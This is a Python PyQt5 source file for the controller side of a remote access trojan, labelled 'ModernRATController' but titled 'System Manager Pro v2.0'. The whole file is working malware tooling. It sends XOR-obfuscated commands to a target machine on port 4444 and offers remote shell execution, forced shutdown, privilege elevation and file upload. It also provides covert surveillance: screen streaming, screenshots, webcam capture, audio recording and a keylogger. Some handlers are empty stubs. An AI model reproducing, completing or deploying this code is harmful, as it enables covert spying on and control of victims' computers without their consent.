import socket
import json
import cv2
import numpy as np
import os
import base64
import time
from PyQt5.QtWidgets import (QApplication, QMainWindow, QWidget, QVBoxLayout, 
                            QHBoxLayout, QTabWidget, QTextEdit, QLineEdit, 
                            QPushButton, QLabel, QListWidget, QProgressBar,
                            QSplitter, QFrame, QFileDialog, QMessageBox,
                            QGridLayout, QGroupBox, QSlider, QCheckBox)
from PyQt5.QtCore import QTimer, Qt, QThread, pyqtSignal
from PyQt5.QtGui import QPixmap, QImage, QFont, QPalette, QColor
import sys

class ClientThread(QThread):
    response_received = pyqtSignal(dict)
    connection_status = pyqtSignal(bool)
    
    def __init__(self, target_ip, target_port):
        super().__init__()
        self.target_ip = target_ip
        self.target_port = target_port
        self.socket = None
        self.is_connected = False
        
    def crypto_encrypt(self, data):
        key = "nazarhktwitch_1337".encode()
        if isinstance(data, str):
            data = data.encode()
        encrypted = bytearray()
        for i in range(len(data)):
            encrypted.append(data[i] ^ key[i % len(key)])
        return base64.b64encode(encrypted).decode()
    
    def crypto_decrypt(self, encrypted_data):
        try:
            encrypted_bytes = base64.b64decode(encrypted_data)
            key = "nazarhktwitch_1337".encode()
            decrypted = bytearray()
            for i in range(len(encrypted_bytes)):
                decrypted.append(encrypted_bytes[i] ^ key[i % len(key)])
            return decrypted.decode()
        except:
            return '{"status": "error", "data": "Decryption failed"}'
    
    def connect_to_target(self):
        try:
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket.connect((self.target_ip, self.target_port))
            self.is_connected = True
            self.connection_status.emit(True)
            return True
        except Exception as e:
            self.connection_status.emit(False)
            return False
    
    def send_command(self, command_type, payload={}):
        if not self.is_connected or not self.socket:
            return {"status": "error", "data": "Not connected"}
        
        command = {
            "type": command_type,
            "payload": payload
        }
        
        try:
            encrypted_command = self.crypto_encrypt(json.dumps(command))
            self.socket.send(encrypted_command.encode())
            
            response = self.socket.recv(65536).decode()
            decrypted_response = self.crypto_decrypt(response)
            return json.loads(decrypted_response)
        except Exception as e:
            return {"status": "error", "data": str(e)}
    
    def run(self):
        pass

class ModernRATController(QMainWindow):
    def __init__(self):
        super().__init__()
        self.client_thread = None
        self.screen_stream_active = False
        self.setup_ui()
        
    def setup_ui(self):
        self.setWindowTitle("System Manager Pro v2.0")
        self.setGeometry(100, 100, 1200, 800)
        self.setStyleSheet(self.get_dark_theme())
        
        central_widget = QWidget()
        self.setCentralWidget(central_widget)
        
        main_layout = QVBoxLayout(central_widget)
        
        self.setup_connection_bar(main_layout)
        self.setup_tabs(main_layout)
        self.setup_status_bar()
    
    def get_dark_theme(self):
        return """
        QMainWindow {
            background-color: #1e1e1e;
            color: #ffffff;
        }
        QWidget {
            background-color: #1e1e1e;
            color: #ffffff;
        }
        QTabWidget::pane {
            border: 1px solid #444;
            background-color: #2d2d30;
        }
        QTabBar::tab {
            background-color: #2d2d30;
            color: #cccccc;
            padding: 8px 16px;
            border: 1px solid #444;
        }
        QTabBar::tab:selected {
            background-color: #007acc;
            color: #ffffff;
        }
        QPushButton {
            background-color: #0e639c;
            color: white;
            border: none;
            padding: 8px 16px;
            border-radius: 4px;
            font-weight: bold;
        }
        QPushButton:hover {
            background-color: #1177bb;
        }
        QPushButton:pressed {
            background-color: #005a9e;
        }
        QTextEdit {
            background-color: #252526;
            color: #cccccc;
            border: 1px solid #444;
            border-radius: 4px;
            padding: 8px;
        }
        QLineEdit {
            background-color: #3c3c3c;
            color: #ffffff;
            border: 1px solid #444;
            border-radius: 4px;
            padding: 6px;
        }
        QListWidget {
            background-color: #252526;
            color: #cccccc;
            border: 1px solid #444;
            border-radius: 4px;
        }
        QProgressBar {
            border: 1px solid #444;
            border-radius: 4px;
            text-align: center;
            color: white;
        }
        QProgressBar::chunk {
            background-color: #007acc;
            border-radius: 3px;
        }
        """
    
    def setup_connection_bar(self, parent_layout):
        connection_frame = QFrame()
        connection_frame.setStyleSheet("background-color: #2d2d30; padding: 10px; border-radius: 8px;")
        connection_layout = QHBoxLayout(connection_frame)
        
        connection_layout.addWidget(QLabel("Target IP:"))
        self.ip_input = QLineEdit()
        self.ip_input.setPlaceholderText("192.168.1.100")
        self.ip_input.setText("127.0.0.1")
        connection_layout.addWidget(self.ip_input)
        
        connection_layout.addWidget(QLabel("Port:"))
        self.port_input = QLineEdit()
        self.port_input.setText("4444")
        connection_layout.addWidget(self.port_input)
        
        self.connect_btn = QPushButton("Connect")
        self.connect_btn.clicked.connect(self.connect_to_target)
        connection_layout.addWidget(self.connect_btn)
        
        self.disconnect_btn = QPushButton("Disconnect")
        self.disconnect_btn.clicked.connect(self.disconnect_from_target)
        self.disconnect_btn.setEnabled(False)
        connection_layout.addWidget(self.disconnect_btn)
        
        self.connection_status = QLabel("Disconnected")
        connection_layout.addWidget(self.connection_status)
        
        parent_layout.addWidget(connection_frame)
    
    def setup_tabs(self, parent_layout):
        self.tabs = QTabWidget()
        
        self.setup_dashboard_tab()
        self.setup_system_tab()
        self.setup_file_tab()
        self.setup_surveillance_tab()
        self.setup_control_tab()
        
        parent_layout.addWidget(self.tabs)
    
    def setup_dashboard_tab(self):
        dashboard_tab = QWidget()
        layout = QVBoxLayout(dashboard_tab)
        
        stats_layout = QHBoxLayout()
        
        sys_card = QGroupBox("System Information")
        sys_layout = QVBoxLayout()
        self.sys_info_display = QTextEdit()
        self.sys_info_display.setMaximumHeight(150)
        sys_layout.addWidget(self.sys_info_display)
        sys_card.setLayout(sys_layout)
        stats_layout.addWidget(sys_card)
        
        actions_card = QGroupBox("Quick Actions")
        actions_layout = QGridLayout()
        
        quick_actions = [
            ("Get System Info", self.get_system_info),
            ("Process List", self.get_process_list),
            ("Network Info", lambda: self.execute_command("ipconfig")),
            ("Disk Space", lambda: self.execute_command("wmic logicaldisk get size,freespace,caption")),
        ]
        
        row, col = 0, 0
        for text, slot in quick_actions:
            btn = QPushButton(text)
            btn.clicked.connect(slot)
            actions_layout.addWidget(btn, row, col)
            col += 1
            if col > 1:
                col = 0
                row += 1
        
        actions_card.setLayout(actions_layout)
        stats_layout.addWidget(actions_card)
        
        layout.addLayout(stats_layout)
        
        output_card = QGroupBox("Command Output")
        output_layout = QVBoxLayout()
        self.command_output = QTextEdit()
        output_layout.addWidget(self.command_output)
        output_card.setLayout(output_layout)
        
        layout.addWidget(output_card)
        
        self.tabs.addTab(dashboard_tab, "Dashboard")
    
    def setup_system_tab(self):
        system_tab = QWidget()
        layout = QVBoxLayout(system_tab)
        
        commands_layout = QGridLayout()
        
        system_commands = [
            ("Restart Target", "shutdown /r /t 0"),
            ("Shutdown Target", "shutdown /s /t 0"),
            ("Lock Workstation", "rundll32.exe user32.dll,LockWorkStation"),
            ("Installed Programs", "wmic product get name,version"),
            ("Services List", "net start"),
            ("Elevate Privileges", self.elevate_privileges),
        ]
        
        row, col = 0, 0
        for text, command in system_commands:
            btn = QPushButton(text)
            if callable(command):
                btn.clicked.connect(command)
            else:
                btn.clicked.connect(lambda checked, cmd=command: self.execute_command(cmd))
            commands_layout.addWidget(btn, row, col)
            col += 1
            if col > 2:
                col = 0
                row += 1
        
        layout.addLayout(commands_layout)
        
        custom_layout = QHBoxLayout()
        self.custom_cmd_input = QLineEdit()
        self.custom_cmd_input.setPlaceholderText("Enter custom command...")
        self.custom_cmd_input.returnPressed.connect(self.execute_custom_command)
        custom_layout.addWidget(self.custom_cmd_input)
        
        execute_btn = QPushButton("Execute")
        execute_btn.clicked.connect(self.execute_custom_command)
        custom_layout.addWidget(execute_btn)
        
        layout.addLayout(custom_layout)
        
        self.tabs.addTab(system_tab, "System")
    
    def setup_file_tab(self):
        file_tab = QWidget()
        layout = QVBoxLayout(file_tab)
        
        file_ops_layout = QHBoxLayout()
        
        upload_btn = QPushButton("Upload File")
        upload_btn.clicked.connect(self.upload_file)
        file_ops_layout.addWidget(upload_btn)
        
        download_btn = QPushButton("Download File")
        download_btn.clicked.connect(self.download_file)
        file_ops_layout.addWidget(download_btn)
        
        list_btn = QPushButton("List Directory")
        list_btn.clicked.connect(self.list_directory)
        file_ops_layout.addWidget(list_btn)
        
        layout.addLayout(file_ops_layout)
        
        self.file_list = QListWidget()
        layout.addWidget(self.file_list)
        
        self.tabs.addTab(file_tab, "File Manager")
    
    def setup_surveillance_tab(self):
        surveillance_tab = QWidget()
        layout = QVBoxLayout(surveillance_tab)
        
        surveillance_layout = QGridLayout()
        
        surveillance_actions = [
            ("Start Screen Stream", self.start_screen_stream),
            ("Stop Screen Stream", self.stop_screen_stream),
            ("Take Screenshot", self.take_screenshot),
            ("Capture Webcam", self.capture_webcam),
            ("Record Audio", self.record_audio),
            ("Start Keylogger", self.start_keylogger),
            ("Get Keylogs", self.get_keylogs),
        ]
        
        row, col = 0, 0
        for text, slot in surveillance_actions:
            btn = QPushButton(text)
            btn.clicked.connect(slot)
            surveillance_layout.addWidget(btn, row, col)
            col += 1
            if col > 2:
                col = 0
                row += 1
        
        layout.addLayout(surveillance_layout)
        
        self.screen_label = QLabel("Screen stream will appear here")
        self.screen_label.setAlignment(Qt.AlignCenter)
        self.screen_label.setStyleSheet("background-color: black; color: white; border: 2px solid #444;")
        self.screen_label.setMinimumHeight(400)
        layout.addWidget(self.screen_label)
        
        self.tabs.addTab(surveillance_tab, "Surveillance")
    
    def setup_control_tab(self):
        control_tab = QWidget()
        layout = QVBoxLayout(control_tab)
        
        control_layout = QGridLayout()
        
        control_actions = [
            ("Mouse Control", self.show_mouse_control),
            ("Virtual Keyboard", self.show_virtual_keyboard),
            ("Volume Control", self.show_volume_control),
            ("Power Management", self.show_power_control),
        ]
        
        row, col = 0, 0
        for text, slot in control_actions:
            btn = QPushButton(text)
            btn.clicked.connect(slot)
            control_layout.addWidget(btn, row, col)
            col += 1
            if col > 1:
                col = 0
                row += 1
        
        layout.addLayout(control_layout)
        
        self.tabs.addTab(control_tab, "Remote Control")
    
    def setup_status_bar(self):
        self.statusBar().showMessage("Ready to connect...")
    
    def connect_to_target(self):
        ip = self.ip_input.text()
        port = int(self.port_input.text())
        
        self.client_thread = ClientThread(ip, port)
        self.client_thread.connection_status.connect(self.handle_connection_status)
        self.client_thread.response_received.connect(self.handle_response)
        
        if self.client_thread.connect_to_target():
            self.connect_btn.setEnabled(False)
            self.disconnect_btn.setEnabled(True)
            self.connection_status.setText("Connected")
            self.log_message("Connected to target system")
            
            QTimer.singleShot(1000, self.get_system_info)
    
    def disconnect_from_target(self):
        if self.client_thread:
            self.client_thread.is_connected = False
            if self.client_thread.socket:
                self.client_thread.socket.close()
        
        self.connect_btn.setEnabled(True)
        self.disconnect_btn.setEnabled(False)
        self.connection_status.setText("Disconnected")
        self.log_message("Disconnected from target")
    
    def handle_connection_status(self, connected):
        if not connected:
            self.disconnect_from_target()
    
    def handle_response(self, response):
        self.log_message(f"Response: {response.get('data', '')}")
    
    def send_command(self, command_type, payload={}):
        if not self.client_thread or not self.client_thread.is_connected:
            self.log_message("Error: Not connected to target")
            return
        
        response = self.client_thread.send_command(command_type, payload)
        self.handle_response(response)
        return response
    
    def execute_command(self, command):
        self.send_command("command", {"cmd": command})
    
    def execute_custom_command(self):
        command = self.custom_cmd_input.text()
        if command:
            self.execute_command(command)
            self.custom_cmd_input.clear()
    
    def get_system_info(self):
        response = self.send_command("system_info")
        if response and response.get("status") == "success":
            info = json.loads(response["data"])
            display_text = "\n".join([f"{k}: {v}" for k, v in info.items()])
            self.sys_info_display.setPlainText(display_text)
    
    def get_process_list(self):
        self.execute_command("tasklist")
    
    def elevate_privileges(self):
        self.send_command("elevate")
    
    def upload_file(self):
        file_path, _ = QFileDialog.getOpenFileName(self, "Select file to upload")
        if file_path:
            try:
                with open(file_path, 'rb') as f:
                    file_data = f.read()
                
                target_name = os.path.basename(file_path)
                self.send_command("file_operation", {
                    "op": "upload",
                    "path": target_name,
                    "data": file_data.hex()
                })
            except Exception as e:
                self.log_message(f"Upload error: {e}")
    
    def download_file(self):
        pass
    
    def list_directory(self):
        self.send_command("file_operation", {
            "op": "list",
            "path": "C:\\"
        })
    
    def start_screen_stream(self):
        self.screen_stream_active = True
        self.stream_timer = QTimer()
        self.stream_timer.timeout.connect(self.update_screen_stream)
        self.stream_timer.start(100)
        self.log_message("Screen stream started")
    
    def stop_screen_stream(self):
        self.screen_stream_active = False
        if hasattr(self, 'stream_timer'):
            self.stream_timer.stop()
        self.log_message("Screen stream stopped")
    
    def update_screen_stream(self):
        if not self.screen_stream_active:
            return
        
        response = self.send_command("screenshot")
        if response and response.get("status") == "success":
            try:
                screen_data = bytes.fromhex(response["data"])
                nparr = np.frombuffer(screen_data, np.uint8)
                img = cv2.imdecode(nparr, cv2.IMREAD_COLOR)
                
                height, width, channel = img.shape
                bytes_per_line = 3 * width
                q_img = QImage(img.data, width, height, bytes_per_line, QImage.Format_RGB888).rgbSwapped()
                
                pixmap = QPixmap.fromImage(q_img)
                scaled_pixmap = pixmap.scaled(self.screen_label.size(), Qt.KeepAspectRatio, Qt.SmoothTransformation)
                self.screen_label.setPixmap(scaled_pixmap)
            except Exception as e:
                print(f"Stream error: {e}")
    
    def take_screenshot(self):
        response = self.send_command("screenshot")
        if response and response.get("status") == "success":
            try:
                screen_data = bytes.fromhex(response["data"])
                nparr = np.frombuffer(screen_data, np.uint8)
                img = cv2.imdecode(nparr, cv2.IMREAD_COLOR)
                
                filename = f"screenshot_{int(time.time())}.jpg"
                cv2.imwrite(filename, img)
                self.log_message(f"Screenshot saved as {filename}")
            except Exception as e:
                self.log_message(f"Screenshot error: {e}")
    
    def capture_webcam(self):
        response = self.send_command("webcam")
        if response and response.get("status") == "success":
            try:
                webcam_data = bytes.fromhex(response["data"])
                if webcam_data.startswith(b"WEBCAM"):
                    self.log_message("Webcam not available")
                    return
                
                nparr = np.frombuffer(webcam_data, np.uint8)
                img = cv2.imdecode(nparr, cv2.IMREAD_COLOR)
                
                filename = f"webcam_{int(time.time())}.jpg"
                cv2.imwrite(filename, img)
                self.log_message(f"Webcam capture saved as {filename}")
            except Exception as e:
                self.log_message(f"Webcam error: {e}")
    
    def record_audio(self):
        response = self.send_command("audio")
        if response and response.get("status") == "success":
            try:
                audio_data = bytes.fromhex(response["data"])
                filename = f"audio_{int(time.time())}.wav"
                with open(filename, 'wb') as f:
                    f.write(audio_data)
                self.log_message(f"Audio recorded as {filename}")
            except Exception as e:
                self.log_message(f"Audio error: {e}")
    
    def start_keylogger(self):
        self.send_command("keylogger_start")
    
    def get_keylogs(self):
        pass
    
    def show_mouse_control(self):
        pass
    
    def show_virtual_keyboard(self):
        pass
    
    def show_volume_control(self):
        pass
    
    def show_power_control(self):
        pass
    
    def log_message(self, message):
        self.command_output.append(f"[{time.strftime('%H:%M:%S')}] {message}")
    
    def closeEvent(self, event):
        self.disconnect_from_target()
        event.accept()

if __name__ == "__main__":
    app = QApplication(sys.argv)
    app.setStyle('Fusion')
    window = ModernRATController()
    window.show()
    sys.exit(app.exec_())